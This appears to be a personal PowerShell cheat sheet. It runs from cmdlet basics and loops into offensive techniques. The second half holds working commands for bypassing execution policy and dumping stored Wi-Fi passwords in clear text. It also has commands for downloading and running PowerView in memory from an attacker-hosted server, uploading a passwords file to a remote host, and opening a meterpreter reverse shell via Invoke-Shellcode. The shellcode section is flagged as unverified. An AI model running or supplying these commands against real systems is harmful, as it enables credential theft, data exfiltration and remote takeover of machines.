PowerShell - Basics


# version
$host.Version

# cmdlets
Every cmdlet in PS starts with a 'verb-noun'.

Get-Command                                    Show all commands
Get-Verb                                       Show all verbs

Get-ChildItem -Recurse                         Show the contents of thee current working directory and all subdirectories
Get-ChildItem -Path C:\Users\lee\Downloads -Recurse
Get-Process
Start-Process .\notepad.exe
Stop-Process -Name notepad
Get-Process | select-object Processname, id    Show all running processes
get-process -IncludeUserName | ft Username, processname | findstr <user>     Show processes running under a specific user

# Alias
Get-Alias                                      Show all aliases
New-Alias -Name "Show-Files" Get-ChildItem     Create a new alias
Get-Alias -Name "Show-Files"                   Get info on an alias

# Help
Get-Help <package>                             Get help on a package
help Import-Module -Examples

# Execution Policy
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process

# File types
script file            .ps1
script data file       .psd1
script module file     .psm1

# Vocabulary
string       Any combination of letters and numbers that are surrounded by quotes. Used for printing stuff.
integer      A number without quotes. Used for math.
boolean      True or false.
variable     A value that can be assigned over the course of a script.

# Objects
PS C:\> $a = "apple" 
PS C:\> $a.Length
5
PS C:\> $a.ToUpper()
APPLE

# Arrays
PS C:\> $list = "red", "white", "blue"
PS C:\> $list[0]
red
PS C:\> $list[2]
blue

# For loops
$list = "one", "two", "three"
forEach ($item in $list){
     write-host = $item
}

$dirs = Get-ChildItem C:\
forEach ($dir in $dirs){
     write-host $dir.FullName
     write-host "-----"
     $acl = $dir.GetAccessControl()
     write-host $acl.AccessToString
     write-host
}

# While loops
$i = 1
while ($i -le 5){
     write-host $i
     $i = $i + 1
}
------------------------------------------------------------------------------------------------------------------------------------------------------

C:\> powershell -nop -exec bypass      Start PowerShell and bypass the execution policy

mode 300                               Full screen
Get-Command                            Show all commands
Get- <tab>                             Tab through each command
Get-History                            Show Command history
Get-Process                            Show current running processes

Get-Help <tool>                        Get help on any tool

- Show Wi-Fi passwords
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
------------------------------------------------------------------------------------------------------------------------------------------------------

# Download a file
cd /usr/share/windows-resources/powersploit/Recon/
python3 -m http.server 80

powershell -nop -exec bypass
iwr -UseBasicParsing http://172.16.219.133/PowerView.ps1 -OutFile .\PowerView.ps1
Import-Module .\PowerView.ps1
Get-NetLocalGroup

# Execute a remote file in memory
powershell -nop -exec bypass
iex (iwr -UseBasicParsing http://172.16.219.133/PowerView.ps1); Get-NetLocalGroup

# Upload a file
powershell -nop -exec bypass
IEX "(New-Object Net.WebClient).UploadString('http://192.168.1.5/passwords.txt',"<PostDATA>")"
------------------------------------------------------------------------------------------------------------------------------------------------------

# PowerSploit - getting a shell without writing to disk     *** NEED to VERIFY ***

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.1.5
set lport 443
exploit -j

- Open a new tab
cd /usr/share/windows-resources/powersploit/CodeExecution/
python3 -m http.server 80

- Windows execute a remote file in memory
powershell -nop -exec bypass
IEX "(New-Object Net.WebClient).DownloadString('http://192.168.1.5/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.5 -Lport 443 -Force"
